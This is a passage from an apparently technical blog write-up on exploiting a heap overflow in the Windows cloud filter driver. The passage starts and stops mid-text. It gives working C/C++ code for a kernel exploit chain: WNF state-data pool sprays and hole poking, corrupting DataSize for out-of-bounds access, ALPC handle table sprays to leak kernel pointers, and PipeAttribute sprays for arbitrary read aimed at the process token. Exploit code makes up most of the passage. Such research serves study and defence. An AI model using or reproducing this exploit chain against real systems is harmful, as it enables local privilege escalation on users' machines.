</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONG ChangeStamp;                                                      <span style="color:#75715e">//0xc
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}; 
</span></span></code></pre></div><p>The Windows Notification Facility (WNF) is a undocumented kernel component used to send notifications across the system. The data used for sending notifications is stored in the <code>_WNF_STATE_DATA</code> object, which is allocated in the paged pool and comprises of a header of size 0x10, followed by the data right after. The maximum DataSize allowed is 0x1000, but that does not cause issues for us since we are working with objects of size 0x1000 (using a DataSize of 0xff0 would mean that the allocated WNF object has a size of 0x1000).</p>
<p>To prepare the <code>_WNF_STATE_DATA</code> spray, we can do the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">#define NUM_WNFSTATEDATA 0x450 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">#define WNF_MAXBUFSIZE 0x1000 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PWNF_STATE_NAME_REGISTRATION PStateNameInfo <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    WNF_STATE_NAME StateNames[NUM_WNFSTATEDATA] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>    PSECURITY_DESCRIPTOR pSD <span style="color:#f92672">=</span> nullptr;
</span></span><span style="display:flex;"><span>    NTSTATUS state <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> StateData[<span style="color:#ae81ff">0x1000</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Prepare _WNF_STATE_DATA spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(StateData, <span style="color:#ae81ff">0x41</span>, <span style="color:#66d9ef">sizeof</span>(StateData));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">ConvertStringSecurityDescriptorToSecurityDescriptor</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;&#34;</span>, SDDL_REVISION_1, <span style="color:#f92672">&amp;</span>pSD, nullptr)) {
</span></span><span style="display:flex;"><span>        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;ConvertStringSecurityDescriptorToSecurityDescriptor failed! error=&#34;</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">GetLastError</span>() <span style="color:#f92672">&lt;&lt;</span> endl;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_WNFSTATEDATA; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtCreateWnfStateName</span>(<span style="color:#f92672">&amp;</span>StateNames[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, WNF_MAXBUFSIZE, pSD);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (state <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;NtCreateWnfStateName failed! error=&#34;</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">GetLastError</span>() <span style="color:#f92672">&lt;&lt;</span> endl;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>We will spray our first <code>_WNF_STATE_DATA</code> spray:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying _WNF_STATE_DATA</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_WNFSTATEDATA; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtUpdateWnfStateData</span>(<span style="color:#f92672">&amp;</span>StateNames[i], StateData, (<span style="color:#ae81ff">0x1000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (state <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;NtUpdateWnfStateData failed! error=&#34;</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">GetLastError</span>() <span style="color:#f92672">&lt;&lt;</span> endl;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>This would result in the memory layout in the paged pool looking like this:</p>
<p><img src="/images/exploiting-cldflt/memory1.jpg" alt="Memory 1"></p>
<p>After which, we will poke holes by freeing every alternate object:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Poking holes by freeing every alternate WNF object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_WNFSTATEDATA; i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">NtDeleteWnfStateData</span>(<span style="color:#f92672">&amp;</span>StateNames[i], NULL);
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtDeleteWnfStateName</span>(<span style="color:#f92672">&amp;</span>StateNames[i]);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (state <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><img src="/images/exploiting-cldflt/memory2.jpg" alt="Memory 2"></p>
<p>It is possible to obtain out-of-bounds read and write using the <code>_WNF_STATE_DATA</code> object by corrupting the DataSize field of the struct. In our case, by using the heap overflow to change DataSize from 0xff0 to 0xff8, we are able to get an 8-byte OOB read/write.</p>
<p>We will now open exploit file 1 to trigger the vulnerability, which will allocate our target object into one of the holes, and overflow into the adjacent <code>_WNF_STATE_DATA</code> object.</p>
<p><img src="/images/exploiting-cldflt/memory3.jpg" alt="Memory 3"></p>
<p>The code path that is taken results in our target object being freed, but that does not matter since the corruption of the <code>_WNF_STATE_DATA</code> object has already occurred. Nevertheless, this is how memory looks like after the free occurs:</p>
<p><img src="/images/exploiting-cldflt/memory4.jpg" alt="Memory 4"></p>
<p>Now let&rsquo;s take a look at Advanced Local Procedure Calls (ALPC). ALPC is an undocumented internal interprocess communication facility in the Windows kernel. ShiJie Xu, Jianyang Song and Linshuang Li have developed a <a href="https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Xu-The-Next-Generation-of-Windows-Exploitation-Attacking-the-Common-Log-File-System.pdf">technique</a> where arbitrary read and write can be obtained via a variable sized <code>_ALPC_HANDLE_TABLE</code> object.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _ALPC_HANDLE_TABLE {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> _ALPC_HANDLE_ENTRY<span style="color:#f92672">*</span> Handles;                                     <span style="color:#75715e">//0x0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _EX_PUSH_LOCK Lock;                                              <span style="color:#75715e">//0x8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONGLONG TotalHandles;                                                 <span style="color:#75715e">//0x10
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONG Flags;                                                            <span style="color:#75715e">//0x18
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}; 
</span></span></code></pre></div><p>A <code>_ALPC_HANDLE_TABLE</code> object is initially allocated in the paged pool with a size of 0x80 when an ALPC port is created. Every time <code>NtAlpcCreateResourceReserve</code> is called, a <code>_KALPC_RESERVE</code> blob is created, and <code>AlpcAddHandleTableEntry</code> is called to add its address to the handle table.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _KALPC_RESERVE {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> _ALPC_PORT<span style="color:#f92672">*</span> OwnerPort;                                           <span style="color:#75715e">//0x0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _ALPC_HANDLE_TABLE<span style="color:#f92672">*</span> HandleTable;                                 <span style="color:#75715e">//0x8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    VOID<span style="color:#f92672">*</span> Handle;                                                           <span style="color:#75715e">//0x10
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> _KALPC_MESSAGE<span style="color:#f92672">*</span> Message;                                         <span style="color:#75715e">//0x18
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONGLONG Size;                                                         <span style="color:#75715e">//0x20
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    LONG Active;                                                            <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}; 
</span></span></code></pre></div><p>Every time the handle table runs out of space, the object is reallocated and its size is doubled. This means that the handle table has a variable size, going from 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000 and so on. Hence, by calling <code>NtAlpcCreateResourceReserve</code> a lot of times, we are able to allocate a <code>_ALPC_HANDLE_TABLE</code> object of size 0x1000 in the paged pool.</p>
<p>To prepare the ALPC handle table spray, we can use the following <a href="https://github.com/zerozenxlabs/CVE-2023-36424/blob/main/CVE-2023-36424-exploit/polpol.cpp">functions</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>CONST WCHAR g_wszPortPrefix[] <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;MyPort&#34;</span>;
</span></span><span style="display:flex;"><span>HANDLE g_hResource <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">CreateALPCPorts</span>(HANDLE<span style="color:#f92672">*</span> phPorts, UINT portsCount) {
</span></span><span style="display:flex;"><span>    ALPC_PORT_ATTRIBUTES serverPortAttr;
</span></span><span style="display:flex;"><span>    OBJECT_ATTRIBUTES    oaPort;
</span></span><span style="display:flex;"><span>    HANDLE               hPort;
</span></span><span style="display:flex;"><span>    NTSTATUS             ntRet;
</span></span><span style="display:flex;"><span>    UNICODE_STRING       usPortName;
</span></span><span style="display:flex;"><span>    WCHAR				 wszPortName[<span style="color:#ae81ff">64</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (UINT i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> portsCount; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">swprintf_s</span>(wszPortName, <span style="color:#66d9ef">sizeof</span>(wszPortName) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(WCHAR), <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">RPC Control</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">%s%d&#34;</span>, g_wszPortPrefix, i);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">RtlInitUnicodeString</span>(<span style="color:#f92672">&amp;</span>usPortName, wszPortName);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">InitializeObjectAttributes</span>(<span style="color:#f92672">&amp;</span>oaPort, <span style="color:#f92672">&amp;</span>usPortName, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">RtlSecureZeroMemory</span>(<span style="color:#f92672">&amp;</span>serverPortAttr, <span style="color:#66d9ef">sizeof</span>(serverPortAttr));
</span></span><span style="display:flex;"><span>        serverPortAttr.MaxMessageLength <span style="color:#f92672">=</span> MAX_MSG_LEN;
</span></span><span style="display:flex;"><span>        ntRet <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtAlpcCreatePort</span>(<span style="color:#f92672">&amp;</span>phPorts[i], <span style="color:#f92672">&amp;</span>oaPort, <span style="color:#f92672">&amp;</span>serverPortAttr);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">SUCCEEDED</span>(ntRet))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">AllocateALPCReserveHandles</span>(HANDLE<span style="color:#f92672">*</span> phPorts, UINT portsCount, UINT reservesCount) {
</span></span><span style="display:flex;"><span>    HANDLE hPort;
</span></span><span style="display:flex;"><span>    HANDLE hResource;
</span></span><span style="display:flex;"><span>    NTSTATUS ntRet;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (UINT i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> portsCount; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        hPort <span style="color:#f92672">=</span> phPorts[i];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (UINT j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> reservesCount; j<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>            ntRet <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtAlpcCreateResourceReserve</span>(hPort, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#f92672">&amp;</span>hResource);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">SUCCEEDED</span>(ntRet))
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (g_hResource <span style="color:#f92672">==</span> NULL) {	<span style="color:#75715e">// save only the very first
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                g_hResource <span style="color:#f92672">=</span> hResource;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>And in main:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">#define NUM_ALPC 0x800
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    HANDLE ports[NUM_ALPC];
</span></span><span style="display:flex;"><span>    CONST UINT portsCount <span style="color:#f92672">=</span> NUM_ALPC;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Creating ALPC ports</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    bRet <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateALPCPorts</span>(ports, portsCount);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>bRet) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] CreateALPCPorts failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>To spray the ALPC handle table object:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Allocating ALPC reserve handles</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    bRet <span style="color:#f92672">=</span> <span style="color:#a6e22e">AllocateALPCReserveHandles</span>(ports, portsCount, reservesCount <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>bRet) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] CreateALPCPorts failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>On a debugger, the <code>_ALPC_HANDLE_TABLE</code> object looks like this:</p>
<p><img src="/images/exploiting-cldflt/alpc_handle_table.jpg" alt="ALPC handle table"></p>
<p>At this point, the memory in the paged pool has the following layout:</p>
<p><img src="/images/exploiting-cldflt/memory5.jpg" alt="Memory 5"></p>
<p>To locate the corrupted <code>_WNF_STATE_DATA</code> object and get our kernel pointer leak, we can do the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    WNF_CHANGE_STAMP stamp;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> WNFOutput[<span style="color:#ae81ff">0x2000</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> WNFOutputSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> CorruptedWNFidx <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; 
</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Finding corrupted WNF_STATE_DATA object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&lt;</span> NUM_WNFSTATEDATA; i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(WNFOutput, <span style="color:#ae81ff">0x0</span>, <span style="color:#66d9ef">sizeof</span>(WNFOutput));
</span></span><span style="display:flex;"><span>        WNFOutputSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtQueryWnfStateData</span>(<span style="color:#f92672">&amp;</span>StateNames[i], NULL, NULL, <span style="color:#f92672">&amp;</span>stamp, WNFOutput, <span style="color:#f92672">&amp;</span>WNFOutputSize);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;    idx: %d, stamp: 0x%lx, state: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i, stamp, state);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (stamp <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xcafe</span>) { 
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Found corrupted object idx: %d, stamp: 0x%lx, state: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i, stamp, state);
</span></span><span style="display:flex;"><span>            CorruptedWNFidx <span style="color:#f92672">=</span> i;
</span></span><span style="display:flex;"><span>            ALPC_leak <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(WNFOutput <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xff0</span>));
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] KALPC_RESERVE leak: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ALPC_leak);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h4 id="arbitrary-read">Arbitrary Read</h4>
<p>Now that we have a kernel pointer leak, we want to gain arbitrary read so that we can obtain the address of token. To do so, the vulnerability can be triggered a second time to overwrite a second <code>_WNF_STATE_DATA</code> data object. Just like before, we are going to spray <code>_WNF_STATE_DATA</code>, poke holes by freeing every alternate object, and then trigger the vulnerability to cause the overflow and corrupt an adjacent <code>_WNF_STATE_DATA</code> object. However this time, we are going to spray <code>PipeAttribute</code>, and use the corrupted <code>_WNF_STATE_DATA</code> to corrupt an adjacent <code>PipeAttribute</code> structure.</p>
<p>The <code>PipeAttribute</code> arbitrary read technique was introduced by Corentin Bayet and Paul Fariello in their paper <a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">Scoop the Windows 10 pool!</a>. When a pipe is created, the user has the ability to add attributes, which are then stored as a key-value pair in a linked list. <code>PipeAttribute</code> is a variable sized structure, is allocated in the paged pool, and has the following form:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> PipeAttribute { 
</span></span><span style="display:flex;"><span>    LIST_ENTRY list; 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> AttributeName; 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> AttributeValueSize; 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> AttributeValue; 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> data[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>To prepare the spray, we must first create pipes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Creating pipe objects</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PIPEATTR; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreatePipe</span>((PHANDLE)<span style="color:#f92672">&amp;</span>ReadPipeArr[i], (PHANDLE)<span style="color:#f92672">&amp;</span>WritePipeArr[i], NULL, <span style="color:#ae81ff">0x0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;CreatePipe failed! error=&#34;</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">GetLastError</span>() <span style="color:#f92672">&lt;&lt;</span> endl;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>To spray <code>PipeAttribute</code>, we can do the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(PipeData, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x20</span>); 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(PipeData<span style="color:#f92672">+</span><span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x40</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying pipe_attribute</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PIPEATTR; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtFsControlFile</span>(WritePipeArr[i], NULL, NULL, NULL, <span style="color:#f92672">&amp;</span>status, <span style="color:#ae81ff">0x11003c</span>, PipeData, (<span style="color:#ae81ff">0x1000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>), PipeOutput, <span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>            cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;NtFsControlFile pipe attribute failed! error=&#34;</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#a6e22e">GetLastError</span>() <span style="color:#f92672">&lt;&lt;</span> endl;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
